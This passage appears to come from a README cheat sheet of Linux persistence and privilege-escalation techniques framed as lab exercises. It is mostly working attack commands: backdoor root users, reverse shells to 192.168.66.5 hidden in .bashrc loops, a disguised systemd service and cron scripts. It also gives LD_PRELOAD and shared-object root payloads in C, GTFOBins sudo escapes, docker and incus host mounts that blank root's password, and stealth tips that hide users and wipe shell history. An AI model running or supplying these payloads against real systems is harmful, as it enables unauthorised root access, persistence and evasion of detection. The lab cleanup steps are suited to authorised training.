**METHOD 5 — pyuser (Python)**
```bash
python3 -c "
import subprocess
h = subprocess.check_output(['openssl','passwd','-6','pyuser']).decode().strip()
open('/etc/passwd','a').write('pyuser:x:1339:1339::/home/pyuser:/bin/bash\n')
open('/etc/shadow','a').write(f'pyuser:{h}:19000:0:99999:7:::\n')
" && groupadd -g 1339 pyuser && mkdir -p /home/pyuser && chown 1339:1339 /home/pyuser
```
> ✅ **Verify all 5:**
```bash
for u in backdoor ghost hacker support pyuser; do echo -n "$u → " && su $u -c "id" 2>&1; done
```
**Hide the user (extra stealth):**
```bash
# GDM3
nano /etc/gdm3/custom.conf
# Add: Exclude=backdoor  under [daemon]

# LightDM
nano /etc/lightdm/users.conf
# Add: hidden-users=backdoor
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
for u in backdoor ghost hacker support pyuser; do
  userdel -r $u 2>/dev/null
  groupdel $u 2>/dev/null
  sed -i "/^${u}:/d" /etc/passwd /etc/shadow /etc/group
  rm -rf /home/$u
done

# Confirm clean
grep -E 'backdoor|ghost|hacker|support|pyuser' /etc/passwd && ls /home/
```
</details>

---

### 02 · 📜 .bashrc / .bash_profile Persistence

<details>
<summary>🔁 Reverse shell that fires every time bash starts</summary>
<br>

**Step 1 — Attacker listener:**
```bash
nc -lvnp 4444
```
**Step 2 — Purge old .bashrc entries:**
```bash
sed -i '/nc 192.168.66.5 4444/d' ~/.bashrc
sed -i '/bash-loop-2222/d' ~/.bashrc
sed -i '/mkfifo \/tmp\/.f/d' ~/.bashrc
sed -i '/mkfifo \/tmp\/f/d' ~/.bashrc
sed -i '/nc 192.168.66.5 4444/d; /mkfifo \/tmp\/.p/d; /mkfifo \/tmp\/f/d; /bash-loop/d; /nc-loop/d; /\/dev\/tcp\/192\.168\.66\.5\/4444/d; /nohup sh -c/d' ~/.bashrc
grep -n -E 'nc|mkfifo|/dev/tcp|bash-loop|nc-loop' ~/.bashrc
```
**Step 3 — Kill lingering jobs:**
```bash
pkill -f 'nc 192.168.66.5 4444'
pkill -f 'mkfifo /tmp/f'
pkill -f 'mkfifo /tmp/.f'
```
**Step 4 — Add bulletproof persistent loop:**
```bash
cat >> ~/.bashrc << 'EOF'
# persistence-loop
if ! pgrep -f "nc-loop-4444" > /dev/null; then
    (
        while true; do
            if ! pgrep -f "nc 192.168.66.5 4444" > /dev/null; then
                rm -f /tmp/.p
                mkfifo /tmp/.p
                cat /tmp/.p | /bin/bash -i 2>&1 | nc 192.168.66.5 4444 > /tmp/.p
            fi
            sleep 10
        done
    ) >/dev/null 2>&1 &
    disown %-
fi
EOF
```
**OR — with PTY shell:**
```bash
pkill -f 'nc 192.168.66.5 4444'
while true; do
    rm -f /tmp/.p
    mkfifo /tmp/.p
    cat /tmp/.p | python3 -c 'import pty; pty.spawn("/bin/bash")' 2>&1 | nc 192.168.66.5 4444 > /tmp/.p
    sleep 5
done
```
**Trigger:**
```bash
exec bash
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
sed -i '/# persistence-loop/,/^fi$/d' ~/.bashrc   # removes the whole loop block
pkill -f 'nc 192.168.66.5 4444' 2>/dev/null
pkill -f 'persistence-loop' 2>/dev/null
rm -f /tmp/.p
history -c && rm ~/.bash_history
```
</details>

---

### 03 · 🔐 SSH Public Key Persistence

<details>
<summary>🔑 Passwordless SSH login that survives reboots</summary>
<br>

**Step 1 — Generate fresh key pair:**
```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persist -N ""
```
**Step 2 — Install public key:**
```bash
cat ~/.ssh/persist.pub > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
**Step 3 — Test passwordless login:**
```bash
ssh -i ~/.ssh/persist kali@192.168.66.5
```
**Backup the key:**
```bash
cp ~/.ssh/persist ~/backup_persist.key
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
sed -i '/persist/d' ~/.ssh/authorized_keys 2>/dev/null
rm -f ~/.ssh/persist ~/.ssh/persist.pub ~/.ssh/config
```
</details>

---

### 04 · 🛰️ Systemd Service + Netcat

<details>
<summary>🛰️ Reverse shell service that auto-restarts on boot</summary>
<br>

**Step 1 — Attacker listener:**
```bash
nc -lvnp 4444
```
**Step 2 — Create service (nc with -e flag):**
```bash
cat > /etc/systemd/system/sysnetwork.service << 'EOF'
[Unit]
Description=System Network Manager Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'nc -e /bin/bash 192.168.66.5 4444'
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
```
**Step 3 — If nc has no -e flag (OpenBSD nc):**
```bash
cat > /etc/systemd/system/sysnetwork.service << 'EOF'
[Unit]
Description=System Network Manager Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'rm -f /tmp/.p; mkfifo /tmp/.p; cat /tmp/.p | /bin/bash -i 2>&1 | nc 192.168.66.5 4444 > /tmp/.p'
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
```
**Step 4 — Enable and start:**
```bash
systemctl daemon-reload && systemctl enable sysnetwork.service && systemctl start sysnetwork.service
```
**Verify:**
```bash
systemctl status sysnetwork.service
systemctl is-enabled sysnetwork.service
systemctl restart sysnetwork.service
systemctl list-units --type=service --state=enabled | grep -v snap
ls -la /etc/systemd/system/
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
systemctl stop sysnetwork.service && \
systemctl disable sysnetwork.service && \
rm /etc/systemd/system/sysnetwork.service && \
systemctl daemon-reload && \
rm -f /tmp/.p

# Verify clean
systemctl status sysnetwork.service 2>&1
ls /etc/systemd/system/ | grep -v snap
```
</details>


---

---

<img src="assets/divider-red.svg" width="100%"/>


---

### 01 · 🟥 SUID Binary Abuse

<details>
<summary>🟥 Find and abuse SUID binaries to get root shell</summary>
<br>

**Find all SUID binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
find / -perm -4000 -type f 2>/dev/null > suid_bins.txt
```
**Exploit — Create SUID root shell:**
```bash
cp /bin/bash /home/kali/bash_suid
sudo chown root:root /home/kali/bash_suid
sudo chmod u+s /home/kali/bash_suid
/home/kali/bash_suid -p
# id → euid=0(root)
```
**Option 2 — .deb postinst trick:**
```bash
mkdir -p /tmp/rootme/DEBIAN
cat > /tmp/rootme/DEBIAN/control << EOF
Package: rootme
Version: 1
Architecture: all
Maintainer: a
Description: a
EOF

cat > /tmp/rootme/DEBIAN/postinst << EOF
#!/bin/bash
/bin/bash -i
EOF

chmod 755 /tmp/rootme/DEBIAN/postinst
dpkg-deb -b /tmp/rootme /tmp/rootme.deb
sudo dpkg -i /tmp/rootme.deb
```
**Option 2 — Single payload:**
```bash
mkdir -p /tmp/rootme/DEBIAN && echo -e 'Package: rootme\nVersion: 1\nArchitecture: all\nMaintainer: a\nDescription: a\n' > /tmp/rootme/DEBIAN/control && echo '#!/bin/bash' > /tmp/rootme/DEBIAN/postinst && echo '/bin/bash -i' >> /tmp/rootme/DEBIAN/postinst && chmod 755 /tmp/rootme/DEBIAN/postinst && dpkg-deb -b /tmp/rootme /tmp/rootme.deb >/dev/null 2>&1 && sudo dpkg -i /tmp/rootme.deb
```
**Option 3:**
```bash
ls -ld /home/kali
sudo chown kali:kali /home/kali
cp /bin/bash /home/kali/shell_suid
sudo chown root:root /home/kali/shell_suid
sudo chmod u+s /home/kali/shell_suid
/home/kali/shell_suid -p
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
sudo rm /home/kali/bash_suid /home/kali/shell_suid /home/kali/test_suid
sudo rm /tmp/vuln /tmp/bash_suid /tmp/libcustom.* /tmp/PwnKit 2>/dev/null
sudo rm /root/testfile 2>/dev/null
```
</details>

---

### 02 · 🧬 Linux Capabilities

<details>
<summary>🧬 Abuse fine-grained capabilities set on binaries</summary>
<br>

**cap_setuid → root shell:**
```bash
cp /usr/bin/python3 /home/kali/pycap
sudo setcap cap_setuid=ep /home/kali/pycap
getcap /home/kali/pycap
# Output: /home/kali/pycap cap_setuid=ep

/home/kali/pycap -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```
**cap_dac_read_search → read any file:**
```bash
cp /bin/cat /home/kali/readcat
sudo setcap cap_dac_read_search=ep /home/kali/readcat
/home/kali/readcat /etc/shadow
```
**cap_sys_ptrace → injection demo:**
```bash
sudo sleep 1000 &
cp /bin/bash /home/kali/ptbash
sudo setcap cap_sys_ptrace=ep /home/kali/ptbash
/home/kali/ptbash -c 'kill -STOP <PID_of_sleep>; echo "Attach would succeed here"'
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
rm /home/kali/pycap /home/kali/readcat /home/kali/ptbash
sudo sed -i '/^evil:/d' /etc/passwd
```
</details>

---

### 03 · 🔓 Vulnerable Sudo / GTFOBins

<details>
<summary>🔓 Exploit sudo misconfigs using GTFOBins binaries</summary>
<br>

> 🎯 **Always check first:**
```bash
sudo -l
sudo -i
```
**find:**
```bash
sudo find . -exec /bin/sh \; -quit
sudo find . -exec /bin/bash -p \; -quit
```
**vim / vi:**
```bash
sudo vim -c ':!/bin/sh'
```
**perl:**
```bash
sudo perl -e 'exec "/bin/sh";'
```
**python:**
```bash
sudo python -c 'import os; os.system("/bin/sh")'
```
**awk:**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
**git:**
```bash
sudo git -p help
# Then type: !/bin/sh
```
**node:**
```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
**Add root user with empty password:**
```bash
echo "root2::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
su root2
```
</details>

---

### 04 · 💉 Sudo SETENV + LD_PRELOAD

<details>
<summary>💉 Inject malicious shared library via sudo SETENV</summary>
<br>

**Setup — Create vulnerable test user:**
```bash
sudo useradd -m -s /bin/bash testuser
sudo passwd testuser          # e.g. lab123
sudo visudo -f /etc/sudoers.d/testuser
# Add this line: testuser ALL=(ALL:ALL) SETENV: ALL
```
**Switch to test user:**
```bash
su - testuser
```
**Create malicious shared library:**
```bash
cat > /tmp/preload.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
```
**Exploit:**
```bash
sudo LD_PRELOAD=/tmp/preload.so /bin/true
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
sudo rm /etc/sudoers.d/testuser
sudo userdel -r testuser
rm /tmp/preload.c /tmp/preload.so
```
</details>

---

### 05 · 🧩 Shared Object Injection

<details>
<summary>🧩 Plant malicious .so in SUID binary RPATH</summary>
<br>

**Build the lab:**
```bash
mkdir -p /home/kali/solab && cd /home/kali/solab

cat > /tmp/libcustom.c << 'EOF'
#include <stdio.h>
void greet() { printf("Hello from library\n"); }
EOF
gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.c

cat > main.c << 'EOF'
void greet();
int main() { greet(); return 0; }
EOF
gcc -o vuln main.c -L/tmp -lcustom -Wl,-rpath,/tmp

sudo chown root:root vuln
sudo chmod u+s vuln
ldd ./vuln | grep custom
# libcustom.so => /tmp/libcustom.so
```
**Exploit:**
```bash
cat > /tmp/evil.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
__attribute__((constructor)) void pwned() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -nostartfiles -o /tmp/libcustom.so /tmp/evil.c
/home/kali/solab/vuln
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
rm -rf /home/kali/solab /tmp/libcustom.so /tmp/evil.c /tmp/libcustom.c 2>/dev/null
```
</details>

---

### 06 · ⏱️ Cron Job Abuse

<details>
<summary>⏱️ Replace a writable root cron script</summary>
<br>

**Setup:**
```bash
sudo mkdir -p /opt/revlab
sudo chmod 777 /opt/revlab

cat << 'EOF' | sudo tee /opt/revlab/backup.sh > /dev/null
#!/bin/bash
bash -i >& /dev/tcp/192.168.66.5/4444 0>&1
EOF
sudo chmod +x /opt/revlab/backup.sh

echo "* * * * * root /opt/revlab/backup.sh" | sudo tee -a /etc/crontab
```
> 👂 **Attacker listener:**
```bash
nc -lvnp 4444
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
sudo sed -i '/\/opt\/revlab\/backup.sh/d' /etc/crontab
sudo rm -rf /opt/revlab
```
</details>

---

### 07 · 🛤️ Writable PATH Hijack

<details>
<summary>🛤️ Plant a malicious binary in root's PATH</summary>
<br>

```bash
# 1. Make target directory world-writable
sudo chmod 777 /usr/local/bin

# 2. Create malicious script
cat > /usr/local/bin/cleanup << 'EOF'
#!/bin/bash
echo "evil::0:0:root:/root:/bin/bash" >> /etc/passwd
EOF
chmod +x /usr/local/bin/cleanup

# 3. Add cron job to root's crontab
echo -e "PATH=/usr/local/bin:/usr/bin:/bin\n* * * * * cleanup" | sudo crontab -

# 4. Verify
sudo crontab -l
# PATH=/usr/local/bin:/usr/bin:/bin
# * * * * * cleanup

# 5. Ensure cron is running
sudo systemctl start cron

# 6. Wait for cron to fire
echo "Waiting for cron to fire..."
sleep 65

# 7. Check /etc/passwd
tail -3 /etc/passwd
# evil::0:0:root:/root:/bin/bash

# 8. Become root
su evil
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
sudo sed -i '/^evil:/d' /etc/passwd
sudo crontab -r
sudo chmod 755 /usr/local/bin
sudo rm /usr/local/bin/cleanup
```
</details>

---

### 08 · 🔧 Systemd Service Abuse

<details>
<summary>🔧 Overwrite a writable root systemd service</summary>
<br>

**Setup:**
```bash
sudo mkdir -p /opt/service-lab && sudo chmod 777 /opt/service-lab

sudo tee /opt/service-lab/cleanup.sh << 'EOF' > /dev/null
#!/bin/bash
echo "$(date) - service ran" >> /var/log/cleanup.log
EOF
sudo chmod 777 /opt/service-lab/cleanup.sh

sudo tee /etc/systemd/system/cleanup.service << 'EOF' > /dev/null
[Unit]
Description=Cleanup Service

[Service]
Type=simple
ExecStart=/opt/service-lab/cleanup.sh
User=root
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl start cleanup.service
sudo systemctl enable cleanup.service
```
**Verify service running:**
```bash
sudo systemctl status cleanup
sudo cat /var/log/cleanup.log
```
**Exploit (as normal kali user):**
```bash
nc -lvnp 4444

cat > /opt/service-lab/cleanup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.66.5/4444 0>&1
EOF

sudo systemctl restart cleanup
# Service auto-restarts every 60s due to Restart=always
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
sudo systemctl stop cleanup
sudo systemctl disable cleanup
sudo rm /etc/systemd/system/cleanup.service
sudo systemctl daemon-reload
sudo rm -rf /opt/service-lab
```
</details>


---

### 09 · 🐳 Docker Group Escalation

<details>
<summary>🐳 docker group = root — mount host fs</summary>
<br>

```bash
# Check current groups
groups

# Install Docker
sudo apt update && sudo apt install docker.io -y

# Add user to docker group
sudo usermod -aG docker $USER

# Activate group in current shell
newgrp docker

# Verify
groups    # should show "docker"

# Mount host root filesystem into container
docker run -v /:/mnt -it alpine

# --- INSIDE CONTAINER ---
sed -i 's/^root:\*:/root::/' /mnt/etc/shadow
head -1 /mnt/etc/shadow    # root:: (no password now)
exit
# --- BACK ON HOST ---

# Become root (no password asked)
su -
```
🧹 **Restore:**
```bash
sed -i 's/^root::/root:*:/' /etc/shadow
passwd -l root
sudo groupdel docker
```
</details>

---

### 10 · 📦 Incus / LXC Container

<details>
<summary>📦 Privileged container w/ host fs mounted</summary>
<br>

**Install and setup:**
```bash
sudo apt update && sudo apt install incus -y
sudo usermod -aG incus $USER
newgrp incus
sudo systemctl start incus && sudo systemctl enable incus
incus admin init --auto
```
**Exploit:**
```bash
# Create privileged container with host mount
incus launch images:alpine/edge privesc -c security.privileged=true
incus config device add privesc host-root disk source=/ path=/mnt/root
incus restart privesc

# Get shell inside container
incus exec privesc -- /bin/sh

# --- INSIDE CONTAINER ---
sed -i 's/^root:[!*]:/root::/' /mnt/root/etc/shadow
exit
# --- BACK ON HOST ---

su -
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
incus stop privesc && incus delete privesc
passwd -l root
sudo gpasswd -d $USER incus
```
</details>

---

### 11 · 🗄️ NFS no_root_squash

<details>
<summary>🗄️ SUID shell via NFS no_root_squash</summary>
<br>

**Preparation:**
```bash
sudo groupadd docker 2>/dev/null
sudo systemctl restart docker.socket && sudo systemctl start docker
docker ps
```
**Setup NFS server on Kali:**
```bash
sudo apt update && sudo apt install nfs-kernel-server -y
sudo mkdir -p /nfs_share && sudo chmod 777 /nfs_share

echo "/nfs_share *(rw,sync,no_root_squash,no_subtree_check)" | sudo tee -a /etc/exports

sudo exportfs -ra && sudo systemctl restart nfs-server
showmount -e localhost
# Export list for localhost:
# /nfs_share *
```
**Simulate NFS client using Docker:**
```bash
docker run -it --rm --privileged --name nfs-client ubuntu bash

# Inside container:
apt update && apt install nfs-common -y
mkdir /mnt/nfs
mount -t nfs 172.17.0.1:/nfs_share /mnt/nfs
touch /mnt/nfs/testfile
cp /bin/bash /mnt/nfs/rootshell
chmod u+s /mnt/nfs/rootshell
ls -l /mnt/nfs/rootshell    # -rwsr-xr-x 1 root root
exit
```
**Escalate on host:**
```bash
/nfs_share/rootshell -p
id    # euid=0(root)
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
sudo rm -f /nfs_share/rootshell /nfs_share/testfile
sudo sed -i '/\/nfs_share/d' /etc/exports
sudo exportfs -ra
sudo systemctl stop nfs-server && sudo systemctl disable nfs-server
sudo rm -rf /nfs_share
sudo apt remove --purge nfs-kernel-server nfs-common -y
docker rm -f nfs-client 2>/dev/null
```
</details>

---

### 12 · 🛡️ Polkit rules.d

<details>
<summary>🛡️ Blanket pkexec grant via rules.d</summary>
<br>

**Identify misconfiguration:**
```bash
find /etc/polkit-1/rules.d/ -writable -type d 2>/dev/null
```
**Create malicious rule:**
```bash
cat > /etc/polkit-1/rules.d/99-pwn.rules << 'EOF'
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.policykit.exec") {
        return polkit.Result.YES;
    }
});
EOF

chmod 644 /etc/polkit-1/rules.d/99-pwn.rules
cat /etc/polkit-1/rules.d/99-pwn.rules
```
**Trigger escalation:**
```bash
pkexec /bin/bash -p
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
rm /etc/polkit-1/rules.d/99-pwn.rules
```
</details>

---

### 13 · 📝 Writable /etc/passwd

<details>
<summary>📝 Inject hash into /etc/passwd</summary>
<br>

```bash
# 1. Make /etc/passwd writable
sudo chmod 646 /etc/passwd
ls -l /etc/passwd    # -rw-rw-rw-

# 2. Generate SHA-512 hash
hash=$(openssl passwd -6 "mani")
echo "$hash"

# 3. Backup original
cp /etc/passwd /etc/passwd.bak

# 4. Patch root's password
sudo sed -i "s|^root:[^:]*:|root:${hash}:|" /etc/passwd
head -1 /etc/passwd
# root:$6$dG91Y2...:0:0:root:/root:/bin/bash

# 5. Become root
su root    # enter: mani
```
**Alternative — Add new root user (safer):**
```bash
hash=$(openssl passwd -6 "mani")
echo "backdoor:${hash}:0:0:root:/root:/bin/bash" >> /etc/passwd
su backdoor    # enter: mani → root
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
sudo cp /etc/passwd.bak /etc/passwd
sudo chmod 644 /etc/passwd
sudo rm /etc/passwd.bak
```
</details>

---

### 14 · 🔏 Readable Root SSH Key

<details>
<summary>🔏 Steal readable root SSH key</summary>
<br>

**Setup:**
```bash
sudo apt update && sudo apt install openssh-server -y
sudo systemctl start ssh && sudo systemctl enable ssh

sudo sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config > /dev/null
sudo systemctl restart ssh
```
**Create key pair and simulate misconfiguration (as root):**
```bash
ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Misconfiguration — make private key world-readable
chmod o+r /root/.ssh/id_rsa
ls -l /root/.ssh/id_rsa    # -rw-r--r--

cp /root/.ssh/id_rsa /home/kali/stolen_key
chown kali:kali /home/kali/stolen_key && chmod 600 /home/kali/stolen_key
exit
```
**Exploit (as kali):**
```bash
ssh -i /home/kali/stolen_key root@localhost
# you got root
```
> 🧹 **CLEANUP — remove all traces after the lab:**
```bash
rm /root/.ssh/id_rsa /root/.ssh/id_rsa.pub
rm /home/kali/stolen_key
> /root/.ssh/authorized_keys
sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart ssh
```
</details>

---

### 15 · 🐚 Reverse Shell via nc

<details>
<summary>🐚 Direct root shell via nc -e</summary>
<br>

```bash
# Target machine
sudo nc -e /bin/sh 192.168.66.5 4444

# Attacker listener
nc -lvnp 4444
```
</details>

---

### 16 · 🧨 Kernel Exploits

<details>
<summary>🧨 Match kernel → known CVEs</summary>
<br>

```bash
uname -a    # Get kernel version → search on exploit-db
```
- 🔗 [Linux Kernel - Local Privilege Escalation (52591)](https://www.exploit-db.com/exploits/52591)
- 🔗 [Linux Kernel - Local Privilege Escalation (52585)](https://www.exploit-db.com/exploits/52585)

</details>

---

### 17 · 📚 Internals Reference

<details>
<summary>📚 Concepts · D-Bus · systemd · tools</summary>
<br>

**Cache Indexing Methods:**
```bash
VIVT — Virtually  Indexed, Virtually  Tagged
PIPT — Physically Indexed, Physically Tagged
PIVT — Physically Indexed, Virtually  Tagged
VIPT — Virtually  Indexed, Physically Tagged
```
**Key Concepts:**
```bash
Seccomp, KSM, MMU, I/O buses, CPU execution ports
CPU mesh, Linux Kernel Crypto Subsystem
Cross-core attack, cross-CPU attack
File I/O: Buffered | Page cache | Standard lib | Synchronized
SELinux vs AppArmor
```
**Systemd / Session:**
```bash
sudo visudo
nano /etc/sudoers
systemd-cgls --unit user.slice
pstree -slap
```
**D-Bus IPC — Enumeration:**
```bash
systemctl status dbus
ps aux | grep dbus
busctl list

# List all names on system bus
dbus-send --system --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# Introspect a service
gdbus introspect --system --dest org.freedesktop.NetworkManager \
  --object-path /org/freedesktop/NetworkManager

busctl introspect org.freedesktop.NetworkManager /org/freedesktop/NetworkManager

# Monitor traffic
busctl monitor
dbus-monitor --system
dbus-monitor --system "destination='org.freedesktop.systemd1'"
```
**D-Bus Layers:**
```bash
Layer 1 — D-Bus Protocol
Layer 2 — libdbus
Layer 3 — D-Bus daemon (dbus-daemon / dbus-broker)
```
**Tools:**
```bash
git clone https://github.com/Aegrah/PANIX.git
git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git
git clone https://github.com/peass-ng/PEASS-ng.git

pip install gtfobins-cli --break-system-packages
gtfo python
```
</details>

---

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:FFD700,50:FF4500,100:8B0000&height=120&section=footer&animation=fadeIn" width="100%"/>

![Enum](https://img.shields.io/badge/🔍_Enumeration-8_techniques-0075ca?style=for-the-badge)
![Persist](https://img.shields.io/badge/🔒_Persistence-4_techniques-e69500?style=for-the-badge)
![PrivEsc](https://img.shields.io/badge/⚡_Privilege_Escalation-17_techniques-d73a4a?style=for-the-badge)

**Curated by [m.manikandan](https://github.com)**<br>
*For educational use in authorized lab environments only. Always run cleanup steps after each lab.* ⭐

</div>
